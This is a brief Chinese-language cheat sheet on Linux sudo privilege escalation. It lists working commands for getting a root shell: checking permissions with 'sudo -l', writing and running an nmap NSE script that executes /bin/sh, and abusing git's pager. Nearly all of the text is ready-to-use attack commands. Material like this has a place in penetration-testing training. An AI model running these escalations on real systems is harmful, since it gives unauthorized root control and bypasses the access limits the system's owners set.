# sudo提权
1. 查看sudo可以执行的命令
```
sudo -l
```
## nmap
如果发现`(root)NOPASSWD:/usr/bin/nmap`则nmap不需要密码便可以用root权限执行,开始提权

    echo 'os.execute("/bin/sh")' > getShell.nse
    sudo -u root nmap --script=getShell.nse

## git
    sudo git -p --help
